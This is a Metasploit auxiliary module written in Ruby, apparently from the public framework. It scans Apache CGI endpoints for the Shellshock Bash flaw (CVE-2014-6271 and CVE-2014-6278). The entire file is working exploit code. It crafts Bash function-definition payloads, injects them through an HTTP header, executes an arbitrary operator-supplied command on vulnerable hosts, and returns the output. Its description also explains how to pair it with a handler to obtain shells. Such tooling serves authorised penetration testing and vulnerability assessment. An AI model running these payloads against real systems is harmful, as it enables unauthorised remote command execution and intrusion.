##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::Remote::HttpClient
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(update_info(info,
      'Name' => 'Apache mod_cgi Bash Environment Variable Injection (Shellshock) Scanner',
      'Description' => %q{
        This module scans for the Shellshock vulnerability, a flaw in how the Bash shell
        handles external environment variables. This module targets CGI scripts in the
        Apache web server by setting the HTTP_USER_AGENT environment variable to a
        malicious function definition.

        PROTIP: Use exploit/multi/handler with a PAYLOAD appropriate to your
        CMD, set ExitOnSession false, run -j, and then run this module to create
        sessions on vulnerable hosts.

        Note that this is not the recommended method for obtaining shells.
        If you require sessions, please use the apache_mod_cgi_bash_env_exec
        exploit module instead.
      },
      'Author' => [
        'Stephane Chazelas', # Vulnerability discovery
        'wvu', # Metasploit module
        'lcamtuf' # CVE-2014-6278
      ],
      'References' => [
        [ 'CVE', '2014-6271' ],
        [ 'CVE', '2014-6278' ],
        [ 'OSVDB', '112004' ],
        [ 'EDB', '34765' ],
        [ 'URL', 'https://access.redhat.com/articles/1200223' ],
        [ 'URL', 'https://seclists.org/oss-sec/2014/q3/649' ]
      ],
      'DisclosureDate' => 'Sep 24 2014',
      'License' => MSF_LICENSE,
      'Notes' =>
          {
            'AKA' => ['Shellshock']
          }
    ))

    register_options([
      OptString.new('TARGETURI', [true, 'Path to CGI script']),
      OptString.new('METHOD', [true, 'HTTP method to use', 'GET']),
      OptString.new('HEADER', [true, 'HTTP header to use', 'User-Agent']),
      OptString.new('CMD', [true, 'Command to run (absolute paths required)',
        '/usr/bin/id']),
      OptEnum.new('CVE', [true, 'CVE to check/exploit', 'CVE-2014-6271',
        ['CVE-2014-6271', 'CVE-2014-6278']])
    ])
  end

  def check_host(ip)
    res = req("echo #{marker}", datastore['CVE'])

    if res && res.body.include?(marker * 3)
      report_vuln(
        :host => ip,
        :port => rport,
        :name => self.name,
        :refs => self.references
      )
      return Exploit::CheckCode::Vulnerable
    elsif res && res.code == 500
      injected_res_code = res.code
    else
      return Exploit::CheckCode::Safe
    end

    res = send_request_cgi({
      'method' => datastore['METHOD'],
      'uri' => normalize_uri(target_uri.path.to_s)
    })

    if res && injected_res_code == res.code
      return Exploit::CheckCode::Unknown
    elsif res && injected_res_code != res.code
      return Exploit::CheckCode::Appears
    end

    Exploit::CheckCode::Unknown
  end

  def run_host(ip)
    return unless check_host(ip) == Exploit::CheckCode::Vulnerable

    res = req(datastore['CMD'], datastore['CVE'])

    if res && res.body =~ /#{marker}(.+)#{marker}/m
      print_good("#{$1}")
      report_vuln(
        :host => ip,
        :port => rport,
        :name => self.name,
        :refs => self.references
      )
    end
  end

  def req(cmd, cve)
    case cve
    when 'CVE-2014-6271'
      sploit = cve_2014_6271(cmd)
    when 'CVE-2014-6278'
      sploit = cve_2014_6278(cmd)
    end

    send_request_cgi(
      'method' => datastore['METHOD'],
      'uri' => normalize_uri(target_uri.path),
      'headers' => {
        datastore['HEADER'] => sploit
      }
    )
  end

  def cve_2014_6271(cmd)
    %Q{() { :;};echo -e "\\r\\n#{marker}$(#{cmd})#{marker}"}
  end

  def cve_2014_6278(cmd)
    %Q{() { _; } >_[$($())] { echo -e "\\r\\n#{marker}$(#{cmd})#{marker}"; }}
  end

  def marker
    @marker ||= Rex::Text.rand_text_alphanumeric(rand(42) + 1)
  end
end
